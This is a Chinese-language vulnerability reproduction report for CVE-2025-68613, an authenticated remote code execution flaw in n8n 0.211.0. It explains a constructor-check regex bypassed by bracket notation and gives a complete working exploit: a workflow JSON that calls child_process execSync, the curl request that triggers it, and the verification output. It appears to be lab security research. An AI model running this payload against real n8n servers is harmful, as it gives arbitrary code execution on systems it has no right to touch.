# CVE-2025-68613 复现报告：n8n 远程代码执行漏洞

本文档详细记录了 n8n 版本 0.211.0 中远程代码执行 (RCE) 漏洞 (CVE-2025-68613) 的成功复现过程。该漏洞允许经过身份验证的用户通过绕过表达式沙箱来执行任意代码。

## 1. 环境搭建

### Docker 配置
我们使用 Docker Compose 部署了 n8n 版本 `0.211.0`。由于架构兼容性问题 (arm64)，我们无法直接使用官方镜像，因此基于官方源码标签 `n8n@0.211.0` 本地构建了镜像。

**`docker-compose.yml`**:
```yaml
version: '3.8'

services:
  n8n:
    image: n8n:0.211.0
    ports:
      - "5678:5678"
    environment:
      - N8N_BASIC_AUTH_ACTIVE=false
      - N8N_VERSION_NOTIFICATIONS_ENABLED=false
      - N8N_PERSONALIZATION_ENABLED=false
      - EXECUTIONS_DATA_SAVE_MANUAL_EXECUTIONS=true # 必需：用于在 UI/API 中查看利用结果
    volumes:
      - ./n8n_data:/home/node/.n8n
    restart: unless-stopped
```

### 认证与访问
受影响的端点需要身份验证。为了复现，我们跳过了初始设置向导，并通过手动修改 SQLite 数据库获得了管理员访问权限：
1.  **创建用户**：手动在数据库中插入了一条包含已知密码哈希的管理员用户记录。
2.  **重置密码**：使用 `change-password` API 和手动注入的重置令牌（token）将密码设置为有效密码（如 `Password123`），从而获取了有效的会话 Cookie。

## 2. 漏洞分析

### 根本原因
该漏洞存在于 `packages/workflow/src/Expression.ts` 文件中。n8n 会校验表达式以防止访问 `constructor` 属性（这可能导致访问 `Function` 构造函数并进而导致 RCE）。
检查使用的是如下正则表达式：
```typescript
const constructorValidation = new RegExp(/\.\s*constructor/gm);
if (parameterValue.match(constructorValidation)) {
    throw new ExpressionError('Expression contains invalid constructor function call', ...);
}
```
**缺陷**：此正则表达式仅检测点号表示法（例如 `.constructor`）。它无法检测括号表示法（例如 `['constructor']`）。

### 绕过技术
攻击者可以通过使用括号表示法访问字符串属性，绕过正则检查并访问实现的 `constructor`，最终通过 `Function` 构造函数执行任意 JavaScript 代码。

**被拦截**: `"".constructor.constructor(...)`
**绕过**: `""['constructor']['constructor'](...)`

## 3. 漏洞利用

### Payload (攻击载荷)
我们构造了一个包含恶意表达式的 workflow JSON payload，放在 `Set` 节点中。该 payload 会在容器文件系统中写入一个文件 `/tmp/pwned_bypass`。

**`exploit_payload.json`**:
```json
{
  "workflowData": {
    "id": "1",
    "name": "CVE-Exploit",
    "nodes": [
      {
        "parameters": {},
        "name": "Start",
        "type": "n8n-nodes-base.start",
        "typeVersion": 1,
        "position": [250, 300]
      },
      {
        "parameters": {
          "values": {
            "string": [
              {
                "name": "rce_output",
                "value": "={{ \"\"[\"constructor\"][\"constructor\"](\"return process.mainModule.require('child_process').execSync('touch /tmp/pwned_bypass')\")() }}"
              }
            ]
          }
        },
        "name": "Set",
        "type": "n8n-nodes-base.set",
        "typeVersion": 1,
        "position": [450, 300]
      }
    ],
    "connections": {
      "Start": {
        "main": [[{ "node": "Set", "type": "main", "index": 0 }]]
      }
    }
  },
  "startNodes": ["Start"]
}
```

### 执行
我们通过经过身份验证的 API 触发了恶意工作流：

```bash
curl -v -b cookies.txt -X POST \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d @exploit_payload.json \
  http://localhost:5678/rest/workflows/run
```

### 验证
我们通过确认 Docker 容器内是否创建了恶意文件来验证利用是否成功：

```bash
docker exec n8n-cve-2025-68613-n8n-1 ls -l /tmp/pwned_bypass
# 输出: -rw-r--r-- 1 node node 0 Dec 23 09:23 /tmp/pwned_bypass
```

该文件的存在证实了我们已成功在容器内以 `node` 用户权限执行了任意代码。
